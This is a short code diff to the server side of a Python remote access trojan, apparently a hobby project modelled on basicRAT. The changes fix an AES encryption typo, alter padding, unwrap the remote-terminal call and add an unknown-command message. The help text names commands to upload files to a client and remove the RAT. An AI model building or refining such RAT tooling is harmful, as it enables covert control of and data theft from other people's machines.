@@ -36,7 +36,7 @@ upload <Path_file> <Path_to_past>       - Upload a file to client
 (don't forget .extension in path)
 remove                                  - Remove the RAT from client
 
-quit                                    -Close server
+quit                                    - Close server
 '''
 
 
@@ -181,9 +181,9 @@ class Client():
 #encryption see https://github.com/vesche/basicRAT/blob/master/core/crypto.py
 def encrypt(key, plaintext):
     #prepare text to encryption (a 16 characters long string is required)
-    plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
+    plaintext = plaintext + "\0" * (AES.block_size - len(plaintext) % AES.block_size)
 	
-    iv = Random.new().red(AES.block_size)
+    iv = Random.new().read(AES.block_size)
     cipher = AES.new(key, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(plaintext)
 
@@ -223,10 +223,10 @@ def main():
             except:
                 print("Sorry, this ID does not exist")
         elif cmd[0] == "terminal":
-            try:
-                clientUsed.execute()
-            except:
-                print("Terminal does not work")
+            #try:
+            clientUsed.execute()
+            #except:
+                #print("Terminal does not work")
         elif cmd[0] == "download":
             try:
                 clientUsed.download(cmd[1], cmd[2])
@@ -241,6 +241,8 @@ def main():
             clientUsed.uninstall()
         elif cmd[0] == "quit":
             break
+        else:
+            print("Command unknown, use help to obtain command list.")
 
     #server.join()
 
